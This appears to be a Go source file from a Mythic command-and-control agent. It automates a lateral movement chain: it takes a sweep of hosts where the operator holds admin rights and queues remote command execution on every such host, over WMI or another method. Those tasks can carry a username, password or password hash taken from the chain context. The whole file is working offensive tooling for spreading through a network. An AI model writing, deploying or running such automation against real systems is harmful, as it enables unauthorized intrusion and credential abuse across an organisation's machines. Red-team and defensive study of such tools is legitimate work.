package agentfunctions

import (
	"encoding/json"
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

type findAdminResult struct {
	Host   string `json:"host"`
	Method string `json:"method"`
	Admin  bool   `json:"admin"`
}

func parseFindAdminResults(text string) []findAdminResult {
	if text == "" || text == "[]" {
		return nil
	}
	var results []findAdminResult
	if err := json.Unmarshal([]byte(text), &results); err != nil {
		return nil
	}
	var admins []findAdminResult
	for _, r := range results {
		if r.Admin {
			admins = append(admins, r)
		}
	}
	return admins
}

func autoMoveFindDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	if responseText == "" {
		completed := true
		response.Completed = &completed
		msg := "Lateral Movement Chain: find-admin returned no results"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	var adminHosts []string
	var results []struct {
		Host   string `json:"host"`
		Admin  bool   `json:"admin"`
		Method string `json:"method"`
	}
	if err := json.Unmarshal([]byte(responseText), &results); err != nil {
		for _, line := range strings.Split(responseText, "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			var single struct {
				Host  string `json:"host"`
				Admin bool   `json:"admin"`
			}
			if err := json.Unmarshal([]byte(line), &single); err == nil && single.Admin {
				adminHosts = append(adminHosts, single.Host)
			}
		}
	} else {
		for _, r := range results {
			if r.Admin {
				adminHosts = append(adminHosts, r.Host)
			}
		}
	}

	hostSet := map[string]bool{}
	var uniqueHosts []string
	for _, h := range adminHosts {
		if !hostSet[h] {
			hostSet[h] = true
			uniqueHosts = append(uniqueHosts, h)
		}
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 1/2] Admin sweep complete. Found %d admin hosts: %s", len(uniqueHosts), strings.Join(uniqueHosts, ", "))),
	})

	if len(uniqueHosts) == 0 {
		completed := true
		response.Completed = &completed
		msg := "Lateral Movement Chain complete: no admin hosts found"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	chainCtx := extractChainContext(taskData.Task.Stdout)

	lateralMethod := chainCtx["lateral_method"]
	lateralCmd := chainCtx["lateral_command"]
	if lateralCmd == "" {
		lateralCmd = "whoami /all"
	}

	var tasks []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks
	groupCallback := "autoMoveLateralDone"

	for _, host := range uniqueHosts {
		var params map[string]interface{}
		switch lateralMethod {
		case "wmi":
			params = map[string]interface{}{
				"host":    host,
				"action":  "exec",
				"command": lateralCmd,
			}
			if chainCtx["username"] != "" {
				params["username"] = chainCtx["username"]
			}
			if chainCtx["password"] != "" {
				params["password"] = chainCtx["password"]
			}
			if chainCtx["hash"] != "" {
				params["hash"] = chainCtx["hash"]
			}
		default:
			params = map[string]interface{}{
				"host":    host,
				"command": lateralCmd,
			}
		}

		paramsJSON, _ := json.Marshal(params)
		tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
			CommandName: lateralMethod,
			Params:      string(paramsJSON),
		})
	}

	_, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
		mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
			TaskID:                taskData.Task.ID,
			GroupName:             "lateral_movement_chain",
			GroupCallbackFunction: &groupCallback,
			Tasks:                 tasks,
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Lateral Movement Chain: failed to create lateral movement subtasks: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 2/2] Created %d %s subtasks for admin hosts.", len(tasks), lateralMethod)),
	})

	return response
}

func autoMoveLateralDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})

	summary := "=== Lateral Movement Chain Complete ===\n"
	if err == nil && searchResult.Success {
		successCount := 0
		errorCount := 0
		for _, task := range searchResult.Tasks {
			if task.Status == "error" {
				errorCount++
			} else if task.Completed {
				successCount++
			}
			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
		}
		summary += fmt.Sprintf("\nTotal: %d subtasks (%d success, %d errors)\n", len(searchResult.Tasks), successCount, errorCount)
	} else {
		summary += "Could not retrieve subtask details.\n"
	}

	completed := true
	response.Completed = &completed
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   parentID,
		Response: []byte(summary),
	})

	return response
}
